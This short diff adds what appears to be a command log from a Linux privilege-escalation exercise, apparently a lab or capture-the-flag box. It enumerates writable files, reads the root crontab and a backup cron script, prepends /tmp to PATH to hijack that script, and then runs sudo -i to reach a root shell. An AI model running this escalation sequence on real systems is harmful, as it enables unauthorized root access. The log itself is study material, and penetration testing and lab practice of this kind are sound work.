@@ -1,0 +1,24 @@
+```log
+whoami
+find /etc -type f -writable 2>/dev/null
+find / -type f -writable 2>/dev/null
+find / -type d -perm -o+w 2>/dev/null
+
+ls -la /var/www/dav
+grep -R "/var/www" /etc 2>/dev/null
+
+cat /etc/crontab
+find / -type f -user root -name "*backup*" 2>/dev/null
+ls -l /etc/cron.daily/backup.sh
+cat /etc/cron.daily/backup.sh
+
+export PATH=/tmp:$PATH
+echo $PATH
+sudo ./backup.sh
+whoami
+id
+
+sudo -l
+sudo -i
+whoami
+id
